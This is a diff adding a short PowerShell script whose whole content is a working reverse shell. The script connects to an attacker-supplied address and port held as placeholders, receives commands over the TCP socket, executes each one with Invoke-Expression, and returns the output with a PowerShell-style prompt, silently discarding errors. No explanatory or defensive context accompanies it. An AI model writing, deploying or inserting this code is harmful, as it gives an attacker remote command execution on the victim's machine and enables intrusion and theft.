@@ -1,0 +1,21 @@
+$LHOST= "[ATTACKER-IP]"; 
+$LPORT= [ATTACKER-PORT]; 
+try{
+    $client= New-Object System.Net.Sockets.TCPClient($LHOST,$LPORT);
+    $stream= $client.GetStream();
+    [byte[]]$bytes = 0..65535|%{0};
+    
+    while(($client.Connected) -and ($stream.CanRead)){
+        $read = $stream.Read($bytes, 0, $bytes.Length);
+        if($read -gt 0){
+            $input= ([text.encoding]::ASCII).GetString($bytes,0, $read).Split("`n");
+            $output= (Invoke-Expression $input[0] 2>&1 | Out-String );
+            $sendback= ([text.encoding]::ASCII).GetBytes($output+'PS> ');
+            $stream.Write($sendback,0,$sendback.Length);
+            $stream.Flush();
+        }
+    }
+    $client.Close()
+}catch{}
+
+
